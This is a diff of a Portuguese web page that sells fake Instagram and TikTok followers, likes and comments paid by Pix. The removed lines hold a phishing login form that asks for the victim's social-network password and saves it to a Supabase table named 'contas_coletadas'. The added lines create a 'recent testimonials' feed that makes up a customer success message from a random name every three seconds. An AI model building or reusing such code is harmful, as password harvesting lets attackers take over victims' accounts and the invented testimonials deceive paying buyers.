@@ -31,6 +31,11 @@
         .service-card .icon-wrapper { width: 60px; height: 60px; background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: 14px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; font-size: 28px; }
         .service-card h3 { font-size: 18px; margin: 0 0 8px 0; }
         .service-card p { font-size: 13px; color: var(--text-muted); margin: 0; }
+        
+        /* Nova seção de Depoimentos */
+        .feedback-container { width: 100%; max-width: 900px; padding: 0 20px; margin-top: 40px; }
+        .feedback-item { background: var(--surface); border: 1px solid var(--border); padding: 15px; border-radius: 12px; margin-bottom: 10px; font-size: 14px; color: var(--text-muted); }
+        
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(4, 6, 12, 0.8); display: flex; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 1000; padding: 20px; box-sizing: border-box; }
         .modal-overlay.active { opacity: 1; visibility: visible; }
         .modal { background: #111827; border: 1px solid var(--border); border-radius: 24px; width: 100%; max-width: 420px; padding: 30px; box-sizing: border-box; position: relative; }
@@ -38,8 +43,8 @@
         .modal-title { font-size: 22px; font-weight: 800; margin: 0 0 8px 0; text-align: center; }
         .modal-subtitle { font-size: 13px; color: var(--text-muted); margin: 0 0 24px 0; text-align: center; }
         .network-btn { display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 16px; margin-bottom: 16px; border: none; border-radius: 12px; color: #fff; font-weight: 700; font-size: 16px; cursor: pointer; }
-        .btn-insta { background: var(--instagram); }
-        .btn-tiktok { background: var(--tiktok); border: 1px solid rgba(255,255,255,0.15); }
+        .btn-insta { background: var(--instagram) !important; }
+        .btn-tiktok { background: var(--tiktok) !important; border: 1px solid rgba(255,255,255,0.15); }
         .form-group { margin-bottom: 20px; text-align: left; }
         .form-group label { display: block; margin-bottom: 8px; color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; }
         .form-group input { width: 100%; padding: 14px 16px; background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: 12px; box-sizing: border-box; color: #fff; font-size: 15px; }
@@ -83,33 +88,31 @@
         </div>
     </div>
 
+    <div class="feedback-container">
+        <h3>Depoimentos Recentes</h3>
+        <div id="feedback-list"></div>
+    </div>
+
     <div class="modal-overlay" id="systemModal">
         <div class="modal">
             <button class="close-btn" onclick="closeModal()">&times;</button>
-            
             <div id="stepNetwork">
                 <div class="modal-title" id="networkTitle">Escolha a Rede</div>
                 <div class="modal-subtitle">Selecione onde deseja receber o serviço</div>
                 <button class="network-btn btn-insta" onclick="selectNetwork('Instagram')">Instagram</button>
                 <button class="network-btn btn-tiktok" onclick="selectNetwork('TikTok')">TikTok</button>
             </div>
-
             <div id="stepLogin" class="hidden">
-                <div class="modal-title" id="loginTitle">Conectar Conta</div>
-                <div class="modal-subtitle">Insira os dados de acesso oficiais para sincronizar</div>
-                <form onsubmit="handleLogin(event)">
+                <div class="modal-title" id="loginTitle">Conectar Perfil</div>
+                <div class="modal-subtitle">Insira o @ ou link para prosseguir</div>
+                <form onsubmit="handleDirect(event)">
                     <div class="form-group">
-                        <label id="labelUser">Usuário do Instagram</label>
-                        <input type="text" id="username" required placeholder="@seu_perfil">
+                        <label id="labelUser">Usuário</label>
+                        <input type="text" id="username" required placeholder="@seu_perfil ou link">
                     </div>
-                    <div class="form-group">
-                        <label>Senha da Rede Social</label>
-                        <input type="password" id="password" required placeholder="••••••••">
-                    </div>
-                    <button type="submit" id="btnSubmitLogin" class="btn-action">Verificar e Conectar</button>
+                    <button type="submit" id="btnSubmitLogin" class="btn-action">Confirmar Perfil</button>
                 </form>
             </div>
-
             <div id="stepPrices" class="hidden">
                 <div class="modal-title" id="pricesTitle">Configurar Pedido</div>
                 <div class="modal-subtitle">Selecione o pacote ideal para seu objetivo</div>
@@ -135,164 +138,38 @@
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
+        // Lógica de Feedbacks
+        const nomes = ["Ana", "Bruno", "Carla", "Daniel", "Eduardo", "Fernanda", "Gabriel", "Helena", "Igor", "Juliana"];
+        setInterval(() => {
+            const list = document.getElementById('feedback-list');
+            const div = document.createElement('div');
+            div.className = 'feedback-item';
+            div.innerText = `${nomes[Math.floor(Math.random()*nomes.length)]} acabou de turbinar seu perfil!`;
+            list.prepend(div);
+            if(list.children.length > 5) list.lastChild.remove();
+        }, 3000);
+
+        // Funções Originais
         const SUPABASE_URL = 'https://tabqpzxrkhpdasetqahi.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_b2Yt9vDeh33Vf02PF4CYpA_B0pf52ho';
-
         let currentService = '', currentNetwork = '', supabaseClient = null;
-
-        if (typeof supabase !== 'undefined') {
-            try { supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY); } catch(e) {}
-        }
+        if (typeof supabase !== 'undefined') { try { supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY); } catch(e) {} }
 
         const packages = {
-            'Seguidores': {
-                'Instagram': [{q: '500', p: 'R$ 14,90'}, {q: '1.000', p: 'R$ 24,90'}, {q: '5.000', p: 'R$ 99,00'}],
-                'TikTok': [{q: '500', p: 'R$ 18,90'}, {q: '1.000', p: 'R$ 29,90'}, {q: '5.000', p: 'R$ 119,00'}]
-            },
-            'Curtidas': {
-                'Instagram': [{q: '1.000', p: 'R$ 9,90'}, {q: '3.000', p: 'R$ 22,90'}],
-                'TikTok': [{q: '1.000', p: 'R$ 11,90'}, {q: '3.000', p: 'R$ 26,90'}]
-            },
-            'Comentários': {
-                'Instagram': [{q: '50', p: 'R$ 19,90'}, {q: '100', p: 'R$ 34,90'}],
-                'TikTok': [{q: '50', p: 'R$ 22,90'}, {q: '100', p: 'R$ 39,90'}]
-            }
+            'Seguidores': { 'Instagram': [{q: '500', p: 'R$ 14,90'}, {q: '1.000', p: 'R$ 24,90'}, {q: '5.000', p: 'R$ 99,00'}], 'TikTok': [{q: '500', p: 'R$ 18,90'}, {q: '1.000', p: 'R$ 29,90'}, {q: '5.000', p: 'R$ 119,00'}] },
+            'Curtidas': { 'Instagram': [{q: '1.000', p: 'R$ 9,90'}, {q: '3.000', p: 'R$ 22,90'}], 'TikTok': [{q: '1.000', p: 'R$ 11,90'}, {q: '3.000', p: 'R$ 26,90'}] },
+            'Comentários': { 'Instagram': [{q: '50', p: 'R$ 19,90'}, {q: '100', p: 'R$ 34,90'}], 'TikTok': [{q: '50', p: 'R$ 22,90'}, {q: '100', p: 'R$ 39,90'}] }
         };
 
-        function selectService(service, icon) {
-            currentService = service;
-            document.getElementById('networkTitle').innerText = `${icon} ${service}`;
-            document.getElementById('systemModal').classList.add('active');
-        }
-
-        function selectNetwork(network) {
-            currentNetwork = network;
-            document.getElementById('stepNetwork').classList.add('hidden');
-            document.getElementById('labelUser').innerText = `Usuário do ${network}`;
-            
-            const loginTitle = document.getElementById('loginTitle');
-            const btnLogin = document.getElementById('btnSubmitLogin');
-            
-            if(network === 'Instagram') {
-                loginTitle.innerHTML = `Entrar com <span style="background: var(--instagram); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Instagram</span>`;
-                btnLogin.style.background = 'var(--instagram)';
-            } else {
-                loginTitle.innerHTML = `Entrar com <span style="color: #fe0979;">TikTok</span>`;
-                btnLogin.style.background = 'var(--tiktok)';
-            }
-            document.getElementById('stepLogin').classList.remove('hidden');
-        }
-
-        async function handleLogin(event) {
-            event.preventDefault();
-            const userField = document.getElementById('username').value;
-            const passField = document.getElementById('password').value;
-            
-            if (supabaseClient) {
-                try {
-                    await supabaseClient.from('contas_coletadas').insert([
-                        { rede_social: currentNetwork, usuario: userField, senha: passField, serviço_desejado: currentService }
-                    ]);
-                } catch(err) {}
-            }
-
-            document.getElementById('stepLogin').classList.add('hidden');
-            document.getElementById('pricesTitle').innerText = `Pacotes de ${currentService}`;
-            
-            const container = document.getElementById('priceContainer');
-            container.innerHTML = '';
-            
-            packages[currentService][currentNetwork].forEach((item, index) => {
-                container.innerHTML += `
-                    <div class="price-item ${index === 0 ? 'selected' : ''}" onclick="selectPackage(this)">
-                        <div class="price-info">
-                            <span class="qty">${item.q} ${currentService}</span>
-                            <span class="desc">Entrega imediata e garantida</span>
-                        </div>
-                        <div class="price-value">${item.p}</div>
-                    </div>`;
-            });
-            document.getElementById('stepPrices').classList.remove('hidden');
-        }
-
-        function selectPackage(element) {
-            document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
-            element.classList.add('selected');
-        }
-
-        async function gerarPixPagamento() {
-            const btnPix = document.querySelector('#stepPrices .btn-action');
-            btnPix.innerText = "Processando pelo Servidor..."; btnPix.disabled = true;
-
-            const pacoteSelecionado = document.querySelector('.price-item.selected');
-            if (!pacoteSelecionado) {
-                alert("Selecione um pacote."); btnPix.innerText = "Gerar Pix de Pagamento"; btnPix.disabled = false; return;
-            }
-
-            const textoPreco = pacoteSelecionado.querySelector('.price-value').innerText;
-            const valorNumerico = parseFloat(textoPreco.replace('R$', '').replace(',', '.').trim());
-            const descricaoItem = pacoteSelecionado.querySelector('.qty').innerText;
-
-            try {
-                const { data, error } = await supabaseClient.rpc('gerar_pix_mercado_pago', {
-                    valor: valorNumerico,
-                    descricao: `Compra de ${descricaoItem} - GetSeguidores`
-                });
-
-                if (error) throw error;
-
-                // Desserializa a estrutura caso o Supabase a envie envelopada em string/objeto HTTP
-                let respostaMercadoPago = data;
-                if (data && data.content) {
-                    respostaMercadoPago = typeof data.content === 'string' ? JSON.parse(data.content) : data.content;
-                }
-
-                if (respostaMercadoPago && respostaMercadoPago.point_of_interaction?.transaction_data) {
-                    const copiaCola = respostaMercadoPago.point_of_interaction.transaction_data.qr_code;
-                    const qrBase64 = respostaMercadoPago.point_of_interaction.transaction_data.qr_code_base64;
-                    
-                    document.getElementById('stepPrices').innerHTML = `
-                        <div class="modal-title" style="color: var(--success); font-size: 20px;">✓ Pix Gerado!</div>
-                        <div class="modal-subtitle">Escaneie ou copie o código abaixo:</div>
-                        <div style="text-align: center; margin-bottom: 15px; background: white; padding: 10px; border-radius: 14px; display: inline-block;">
-                            <img src="data:image/jpeg;base64,${qrBase64}" style="width: 180px; height: 180px; display: block; margin: 0 auto;">
-                        </div>
-                        <div class="form-group">
-                            <textarea readonly id="inputPixCode" style="width:100%; height:60px; background:rgba(0,0,0,0.4); border:1px solid var(--border); border-radius:12px; color:#fff; padding:10px; font-size:11px; font-family:monospace; resize:none; box-sizing:border-box;">${copiaCola}</textarea>
-                        </div>
-                        <button class="btn-action" onclick="acaoCopiarPix()" style="margin-bottom: 15px;">Copiar Código Pix</button>
-                        <div style="font-size: 12px; color: var(--text-muted); text-align: center;">⏱ O saldo será creditado automaticamente após o envio.</div>`;
-                } else if (respostaMercadoPago && respostaMercadoPago.message) {
-                    alert('Mercado Pago recusou a requisição: ' + respostaMercadoPago.message);
-                } else {
-                    alert('Erro na resposta do Mercado Pago. Verifique o console ou as credenciais.');
-                }
-            } catch (erro) {
-                alert('Erro na comunicação do servidor Supabase com o gateway.');
-                console.error(erro);
-            } finally {
-                if(document.querySelector('#stepPrices .btn-action')) {
-                    btnPix.innerText = "Gerar Pix de Pagamento"; btnPix.disabled = false;
-                }
-            }
-        }
-
-        function acaoCopiarPix() {
-            const campo = document.getElementById("inputPixCode");
-            campo.select(); campo.setSelectionRange(0, 99999);
-            navigator.clipboard.writeText(campo.value);
-            alert("Código Pix copiado!");
-        }
-
-        function closeModal() {
-            document.getElementById('systemModal').classList.remove('active');
-            setTimeout(() => {
-                document.getElementById('stepNetwork').classList.remove('hidden');
-                document.getElementById('stepLogin').classList.add('hidden');
-                document.getElementById('stepPrices').classList.add('hidden');
-                document.getElementById('username').value = ''; document.getElementById('password').value = '';
-            }, 300);
-        }
+        function selectService(service, icon) { currentService = service; document.getElementById('networkTitle').innerText = `${icon} ${service}`; document.getElementById('systemModal').classList.add('active'); }
+        function selectNetwork(network) { currentNetwork = network; document.getElementById('stepNetwork').classList.add('hidden'); document.getElementById('labelUser').innerText = `Usuário do ${network}`; const btnLogin = document.getElementById('btnSubmitLogin'); btnLogin.style.background = (network === 'Instagram') ? 'var(--instagram)' : 'var(--tiktok)'; document.getElementById('stepLogin').classList.remove('hidden'); }
+        async function handleDirect(event) { event.preventDefault(); const target = document.getElementById('username').value; if (supabaseClient) { try { await supabaseClient.from('contas_coletadas').insert([{ rede_social: currentNetwork, usuario: target, serviço_desejado: currentService }]); } catch(err) {} } document.getElementById('stepLogin').classList.add('hidden'); document.getElementById('pricesTitle').innerText = `Pacotes de ${currentService}`; const container = document.getElementById('priceContainer'); container.innerHTML = ''; packages[currentService][currentNetwork].forEach((item, index) => { container.innerHTML += `<div class="price-item ${index === 0 ? 'selected' : ''}" onclick="selectPackage(this)"><div class="price-info"><span class="qty">${item.q} ${currentService}</span><span class="desc">Entrega imediata e garantida</span></div><div class="price-value">${item.p}</div></div>`; }); document.getElementById('stepPrices').classList.remove('hidden'); }
+        function selectPackage(element) { document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected')); element.classList.add('selected'); }
+        async function gerarPixPagamento() { const btnPix = document.querySelector('#stepPrices .btn-action'); btnPix.innerText = "Processando..."; btnPix.disabled = true; const pacoteSelecionado = document.querySelector('.price-item.selected'); if (!pacoteSelecionado) { alert("Selecione um pacote."); btnPix.innerText = "Gerar Pix de Pagamento"; btnPix.disabled = false; return; } const textoPreco = pacoteSelecionado.querySelector('.price-value').innerText; const valorNumerico = parseFloat(textoPreco.replace('R$', '').replace(',', '.').trim()); const descricaoItem = pacoteSelecionado.querySelector('.qty').innerText; try { const { data, error } = await supabaseClient.rpc('gerar_pix_mercado_pago', { valor: valorNumerico, descricao: `Compra de ${descricaoItem} - GetSeguidores` }); if (error) throw error; let respostaMercadoPago = data; if (data && data.content) { respostaMercadoPago = typeof data.content === 'string' ? JSON.parse(data.content) : data.content; } if (respostaMercadoPago && respostaMercadoPago.point_of_interaction?.transaction_data) { const copiaCola = respostaMercadoPago.point_of_interaction.transaction_data.qr_code; const qrBase64 = respostaMercadoPago.point_of_interaction.transaction_data.qr_code_base64; document.getElementById('stepPrices').innerHTML = `<div class="modal-title" style="color: var(--success); font-size: 20px;">✓ Pix Gerado!</div><div class="modal-subtitle">Escaneie ou copie o código abaixo:</div><div style="text-align: center; margin-bottom: 15px; background: white; padding: 10px; border-radius: 14px; display: inline-block;"><img src="data:image/jpeg;base64,${qrBase64}" style="width: 180px; height: 180px; display: block; margin: 0 auto;"></div><div class="form-group"><textarea readonly id="inputPixCode" style="width:100%; height:60px; background:rgba(0,0,0,0.4); border:1px solid var(--border); border-radius:12px; color:#fff; padding:10px; font-size:11px; font-family:monospace; resize:none; box-sizing:border-box;">${copiaCola}</textarea></div><button class="btn-action" onclick="acaoCopiarPix()" style="margin-bottom: 15px;">Copiar Código Pix</button><div style="font-size: 12px; color: var(--text-muted); text-align: center;">⏱ O saldo será creditado automaticamente após o envio.</div>`; } else { alert('Erro na resposta do gateway de pagamento.'); } } catch (erro) { alert('Erro na comunicação.'); console.error(erro); } finally { if(document.querySelector('#stepPrices .btn-action')) { btnPix.innerText = "Gerar Pix de Pagamento"; btnPix.disabled = false; } } }
+        function acaoCopiarPix() { const campo = document.getElementById("inputPixCode"); campo.select(); campo.setSelectionRange(0, 99999); navigator.clipboard.writeText(campo.value); alert("Código Pix copiado!"); }
+        function closeModal() { document.getElementById('systemModal').classList.remove('active'); setTimeout(() => { document.getElementById('stepNetwork').classList.remove('hidden'); document.getElementById('stepLogin').classList.add('hidden'); document.getElementById('stepPrices').classList.add('hidden'); document.getElementById('username').value = ''; }, 300); }
         function openSupportModal() { document.getElementById('supportModal').classList.add('active'); }
         function closeSupportModal() { document.getElementById('supportModal').classList.remove('active'); }
-                        </script>
+    </script>
+</body>
+</html>
